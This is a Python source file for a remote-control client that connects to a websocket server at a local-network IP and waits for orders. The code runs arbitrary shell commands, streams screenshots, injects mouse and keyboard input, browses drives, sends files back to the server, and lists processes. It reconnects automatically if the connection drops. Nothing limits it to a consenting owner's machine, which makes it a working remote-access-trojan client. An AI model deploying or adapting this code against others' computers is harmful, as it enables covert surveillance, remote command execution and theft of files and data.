import asyncio
import json
import platform
import socket
import uuid
import subprocess
from PIL import ImageGrab, Image
import io
import websockets
import logging
import sys
import time
import pyautogui
import threading
import base64
from io import BytesIO
import os
import win32gui
import win32con
import win32api
import ctypes
from ctypes import wintypes

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Configure your server address here
SERVER_URI = "ws://192.168.178.161:8081/ws"
CLIENT_NAME = platform.node()
CLIENT_ID = str(uuid.uuid4())
RECONNECT_DELAY = 5  # seconds

# Screen sharing settings
SCREEN_QUALITY = 70  # JPEG quality (0-100)
SCREEN_INTERVAL = 0.1  # seconds between screenshots
screen_sharing_active = False
screen_sharing_thread = None

def get_screen():
    try:
        # Capture screen
        screenshot = ImageGrab.grab()
        # Convert to JPEG to reduce size
        buffer = BytesIO()
        screenshot.save(buffer, format='JPEG', quality=SCREEN_QUALITY)
        return base64.b64encode(buffer.getvalue()).decode('utf-8')
    except Exception as e:
        logger.error(f"Error capturing screen: {e}")
        return None

def screen_sharing_loop(ws):
    global screen_sharing_active
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    while screen_sharing_active:
        try:
            screen_data = get_screen()
            if screen_data:
                loop.run_until_complete(ws.send(json.dumps({
                    'type': 'response',
                    'client_id': CLIENT_ID,
                    'action': 'screenshot',
                    'data': screen_data
                })))
            time.sleep(SCREEN_INTERVAL)
        except Exception as e:
            logger.error(f"Error in screen sharing loop: {e}")
            logger.exception(e)
            break
    
    loop.close()

def handle_mouse_action(data):
    try:
        action = data.get('action')
        x = data.get('x')
        y = data.get('y')
        button = data.get('button', 'left')
        
        logger.info(f"Mouse action: {action} at ({x}, {y}) with button {button}")
        
        # Get screen dimensions
        screen_width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        screen_height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        
        # Scale coordinates to actual screen size
        abs_x = int(x * screen_width / 1920)  # Assuming 1920x1080 as base resolution
        abs_y = int(y * screen_height / 1080)
        
        logger.info(f"Scaled coordinates: ({abs_x}, {abs_y})")
        
        if action == 'move':
            win32api.SetCursorPos((abs_x, abs_y))
        elif action == 'click':
            if button == 'left':
                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, abs_x, abs_y, 0, 0)
                time.sleep(0.1)
                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, abs_x, abs_y, 0, 0)
            elif button == 'right':
                win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, abs_x, abs_y, 0, 0)
                time.sleep(0.1)
                win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, abs_x, abs_y, 0, 0)
        elif action == 'rightclick':
            win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, abs_x, abs_y, 0, 0)
            time.sleep(0.1)
            win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, abs_x, abs_y, 0, 0)
        elif action == 'doubleclick':
            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, abs_x, abs_y, 0, 0)
            time.sleep(0.1)
            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, abs_x, abs_y, 0, 0)
            time.sleep(0.1)
            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, abs_x, abs_y, 0, 0)
            time.sleep(0.1)
            win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, abs_x, abs_y, 0, 0)
        
        logger.info(f"Mouse action completed: {action}")
    except Exception as e:
        logger.error(f"Error handling mouse action: {e}")
        logger.exception(e)

def handle_keyboard_action(data):
    try:
        action = data.get('action')
        key = data.get('key')
        
        if action == 'press':
            # Map special keys
            key_map = {
                'Enter': '\n',
                'Tab': '\t',
                'Backspace': '\b',
                'Delete': '\x1b[3~',
                'ArrowUp': '\x1b[A',
                'ArrowDown': '\x1b[B',
                'ArrowLeft': '\x1b[D',
                'ArrowRight': '\x1b[C',
                'Escape': '\x1b',
                'Control': 'ctrl',
                'Alt': 'alt',
                'Shift': 'shift',
                'Meta': 'win'
            }
            
            mapped_key = key_map.get(key, key)
            if len(mapped_key) == 1:
                # Single character
                win32api.keybd_event(ord(mapped_key.upper()), 0, 0, 0)
                time.sleep(0.1)
                win32api.keybd_event(ord(mapped_key.upper()), 0, win32con.KEYEVENTF_KEYUP, 0)
            else:
                # Special key
                pyautogui.press(mapped_key.lower())
        elif action == 'type':
            pyautogui.write(key)
        elif action == 'hotkey':
            keys = key.split('+')
            pyautogui.hotkey(*[k.lower() for k in keys])
    except Exception as e:
        logger.error(f"Error handling keyboard action: {e}")

def show_message_box(message):
    try:
        import ctypes
        MessageBox = ctypes.windll.user32.MessageBoxW
        MessageBox(None, message, "Remote Message", 0x40)  # 0x40 is MB_ICONINFORMATION
    except Exception as e:
        logger.error(f"Error showing message box: {e}")

async def handle_directory_command(cmd, ws):
    try:
        if cmd == 'get_files':
            if platform.system() == 'Windows':
                if not hasattr(handle_directory_command, 'current_dir'):
                    # First time, show all drives
                    drives = []
                    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                        if os.path.exists(f'{letter}:'):
                            drives.append(f'{letter}:\\')
                    handle_directory_command.current_dir = os.getcwd()
                    output = '\n'.join(drives)
                    logger.info(f"Listing drives: {output}")
                else:
                    # Show contents of current directory
                    current_dir = handle_directory_command.current_dir
                    try:
                        items = os.listdir(current_dir)
                        # Get full paths and sort (directories first)
                        items = [os.path.join(current_dir, item) for item in items]
                        items.sort(key=lambda x: (not os.path.isdir(x), x.lower()))
                        # Add trailing slash for directories
                        items = [item + '\\' if os.path.isdir(item) else item for item in items]
                        output = '\n'.join(items)
                        logger.info(f"Listing directory {current_dir}: {output}")
                    except Exception as e:
                        logger.error(f"Error listing directory: {e}")
                        output = f"Error: {str(e)}"
            else:
                current_dir = getattr(handle_directory_command, 'current_dir', os.getcwd())
                output = subprocess.check_output(f'find "{current_dir}" -maxdepth 1 -type f -o -type d', shell=True).decode('utf-8', errors='ignore')
        elif cmd.startswith('cd '):
            new_dir = cmd[3:].strip().strip('"\'')
            logger.info(f"Changing directory to: {new_dir}")
            
            if platform.system() == 'Windows':
                if new_dir == '..':
                    # Handle parent directory
                    current_dir = getattr(handle_directory_command, 'current_dir', os.getcwd())
                    parent_dir = os.path.dirname(current_dir)
                    if parent_dir and os.path.exists(parent_dir):
                        handle_directory_command.current_dir = parent_dir
                        items = os.listdir(parent_dir)
                        items = [os.path.join(parent_dir, item) for item in items]
                        items.sort(key=lambda x: (not os.path.isdir(x), x.lower()))
                        items = [item + '\\' if os.path.isdir(item) else item for item in items]
                        output = '\n'.join(items)
                        logger.info(f"Changed to parent directory: {parent_dir}")
                    else:
                        output = "Error: Cannot navigate to parent directory"
                        logger.error(output)
                elif os.path.exists(new_dir):
                    if os.path.isdir(new_dir):
                        handle_directory_command.current_dir = new_dir
                        items = os.listdir(new_dir)
                        items = [os.path.join(new_dir, item) for item in items]
                        items.sort(key=lambda x: (not os.path.isdir(x), x.lower()))
                        items = [item + '\\' if os.path.isdir(item) else item for item in items]
                        output = '\n'.join(items)
                        logger.info(f"Successfully changed to directory: {new_dir}")
                    else:
                        output = f"Error: {new_dir} is not a directory"
                        logger.error(output)
                else:
                    output = f"Error: Directory {new_dir} does not exist"
                    logger.error(output)
            else:
                if new_dir == '..':
                    current_dir = getattr(handle_directory_command, 'current_dir', os.getcwd())
                    parent_dir = os.path.dirname(current_dir)
                    if parent_dir and os.path.exists(parent_dir):
                        handle_directory_command.current_dir = parent_dir
                        output = subprocess.check_output(f'find "{parent_dir}" -maxdepth 1 -type f -o -type d', shell=True).decode('utf-8', errors='ignore')
                        logger.info(f"Changed to parent directory: {parent_dir}")
                    else:
                        output = "Error: Cannot navigate to parent directory"
                        logger.error(output)
                elif os.path.exists(new_dir) and os.path.isdir(new_dir):
                    handle_directory_command.current_dir = new_dir
                    output = subprocess.check_output(f'find "{new_dir}" -maxdepth 1 -type f -o -type d', shell=True).decode('utf-8', errors='ignore')
                    logger.info(f"Successfully changed to directory: {new_dir}")
                else:
                    output = f"Error: Directory {new_dir} does not exist or is not accessible"
                    logger.error(output)
        
        await ws.send(json.dumps({
            'type': 'response',
            'client_id': CLIENT_ID,
            'action': 'files',
            'data': output
        }))
    except Exception as e:
        logger.error(f"Error handling directory command: {e}")
        logger.exception(e)
        await ws.send(json.dumps({
            'type': 'response',
            'client_id': CLIENT_ID,
            'action': 'files',
            'data': f'Error: {str(e)}',
            'error': True
        }))

async def execute_command(cmd, ws):
    try:
        if cmd.startswith('message:'):
            # Handle message command
            message = cmd[8:].strip()
            show_message_box(message)
            await ws.send(json.dumps({
                'type': 'response',
                'client_id': CLIENT_ID,
                'action': 'message',
                'data': f'Message displayed: {message}',
                'status': 'completed'
            }))
            return

        if cmd.startswith('download_file:'):
            try:
                file_path = cmd[13:].strip()  # Remove 'download_file:' prefix
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    with open(file_path, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode('utf-8')
                        await ws.send(json.dumps({
                            'type': 'response',
                            'client_id': CLIENT_ID,
                            'action': 'file_download',
                            'data': file_data,
                            'filename': os.path.basename(file_path)
                        }))
                else:
                    await ws.send(json.dumps({
                        'type': 'response',
                        'client_id': CLIENT_ID,
                        'action': 'file_download',
                        'data': 'File not found',
                        'status': 'error'
                    }))
            except Exception as e:
                logger.error(f"Error downloading file: {e}")
                await ws.send(json.dumps({
                    'type': 'response',
                    'client_id': CLIENT_ID,
                    'action': 'file_download',
                    'data': str(e),
                    'status': 'error'
                }))
        elif cmd in ['get_files'] or cmd.startswith('cd '):
            logger.info(f"Handling directory command: {cmd}")
            await handle_directory_command(cmd, ws)
        elif cmd == 'screenshot':
            screen_data = get_screen()
            if screen_data:
                await ws.send(json.dumps({
                    'type': 'response',
                    'client_id': CLIENT_ID,
                    'action': 'screenshot',
                    'data': screen_data
                }))
        elif cmd == 'start_screen_sharing':
            global screen_sharing_active, screen_sharing_thread
            if not screen_sharing_active:
                screen_sharing_active = True
                screen_sharing_thread = threading.Thread(
                    target=screen_sharing_loop,
                    args=(ws,),
                    daemon=True
                )
                screen_sharing_thread.start()
                await ws.send(json.dumps({
                    'type': 'response',
                    'client_id': CLIENT_ID,
                    'action': 'screen_sharing_started'
                }))
                logger.info("Screen sharing started")
        elif cmd == 'stop_screen_sharing':
            screen_sharing_active = False
            if screen_sharing_thread:
                screen_sharing_thread.join(timeout=1.0)
            await ws.send(json.dumps({
                'type': 'response',
                'client_id': CLIENT_ID,
                'action': 'screen_sharing_stopped'
            }))
            logger.info("Screen sharing stopped")
        elif cmd == 'get_processes':
            try:
                if platform.system() == 'Windows':
                    output = subprocess.check_output('tasklist /FO CSV /NH', shell=True).decode('utf-8', errors='ignore')
                else:
                    output = subprocess.check_output('ps aux', shell=True).decode('utf-8', errors='ignore')
                await ws.send(json.dumps({
                    'type': 'response',
                    'client_id': CLIENT_ID,
                    'action': 'processes',
                    'data': output
                }))
            except Exception as e:
                logger.error(f"Error getting processes: {e}")
                await ws.send(json.dumps({
                    'type': 'response',
                    'client_id': CLIENT_ID,
                    'action': 'processes',
                    'data': f'Error: {str(e)}',
                    'error': True
                }))
        else:
            # Execute shell command with timeout
            try:
                # Use shell=True to ensure commands work on both Windows and Unix
                process = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    shell=True,
                    cwd=os.getcwd()  # Use current working directory
                )
                
                # Send initial command echo
                await ws.send(json.dumps({
                    'type': 'response',
                    'client_id': CLIENT_ID,
                    'action': 'exec',
                    'command': cmd,
                    'data': f'Executing: {cmd}\n',
                    'status': 'started'
                }))
                
                try:
                    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                    output = stdout.decode('utf-8', errors='ignore')
                    error = stderr.decode('utf-8', errors='ignore')
                    
                    # Send the output
                    if output:
                        await ws.send(json.dumps({
                            'type': 'response',
                            'client_id': CLIENT_ID,
                            'action': 'exec',
                            'command': cmd,
                            'data': output,
                            'status': 'output'
                        }))
                    
                    # Send any errors
                    if error:
                        await ws.send(json.dumps({
                            'type': 'response',
                            'client_id': CLIENT_ID,
                            'action': 'exec',
                            'command': cmd,
                            'data': error,
                            'status': 'error'
                        }))
                    
                    # Send completion status
                    await ws.send(json.dumps({
                        'type': 'response',
                        'client_id': CLIENT_ID,
                        'action': 'exec',
                        'command': cmd,
                        'data': f'\nCommand completed with exit code: {process.returncode}',
                        'status': 'completed'
                    }))
                    
                except asyncio.TimeoutError:
                    process.kill()
                    await ws.send(json.dumps({
                        'type': 'response',
                        'client_id': CLIENT_ID,
                        'action': 'exec',
                        'command': cmd,
                        'data': 'Command timed out after 30 seconds',
                        'status': 'error'
                    }))
                    
            except Exception as e:
                logger.error(f"Error executing command: {e}")
                await ws.send(json.dumps({
                    'type': 'response',
                    'client_id': CLIENT_ID,
                    'action': 'exec',
                    'command': cmd,
                    'data': f'Error: {str(e)}',
                    'status': 'error'
                }))
    except Exception as e:
        logger.error(f"Error in execute_command: {e}")
        await ws.send(json.dumps({
            'type': 'response',
            'client_id': CLIENT_ID,
            'action': 'exec',
            'command': cmd,
            'data': f'Error: {str(e)}',
            'status': 'error'
        }))

async def handle_server():
    while True:
        try:
            async with websockets.connect(SERVER_URI, ping_interval=30, ping_timeout=10) as ws:
                logger.info("Connected to server")
                
                # Register as client
                await ws.send(json.dumps({
                    'type': 'register_client',
                    'client_id': CLIENT_ID,
                    'name': CLIENT_NAME,
                    'info': {
                        'hostname': socket.gethostname(),
                        'ip': socket.gethostbyname(socket.gethostname()),
                        'platform': platform.platform(),
                        'python_version': platform.python_version()
                    }
                }))

                # Listen for commands
                async for message in ws:
                    try:
                        data = json.loads(message)
                        logger.info(f"Received message: {data}")
                        
                        if data['type'] == 'command':
                            command = data.get('command')
                            if command == 'mouse':
                                logger.info(f"Handling mouse action: {data}")
                                handle_mouse_action(data)
                            elif command == 'keyboard':
                                logger.info(f"Handling keyboard action: {data}")
                                handle_keyboard_action(data)
                            else:
                                logger.info(f"Executing command: {command}")
                                await execute_command(command, ws)
                        elif data['type'] == 'mouse':
                            handle_mouse_action(data)
                        elif data['type'] == 'keyboard':
                            handle_keyboard_action(data)
                        else:
                            logger.warning(f"Unknown message type: {data['type']}")
                    except json.JSONDecodeError as e:
                        logger.error(f"Invalid JSON received: {message}")
                        logger.exception(e)
                    except Exception as e:
                        logger.error(f"Error processing message: {e}")
                        logger.exception(e)

        except websockets.exceptions.ConnectionClosed as e:
            logger.warning(f"Connection to server closed: {e}")
        except Exception as e:
            logger.error(f"Connection error: {e}")
            logger.exception(e)
        
        logger.info(f"Waiting {RECONNECT_DELAY} seconds before reconnecting...")
        await asyncio.sleep(RECONNECT_DELAY)

if __name__ == '__main__':
    try:
        asyncio.run(handle_server())
    except KeyboardInterrupt:
        logger.info("Client shutting down...")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)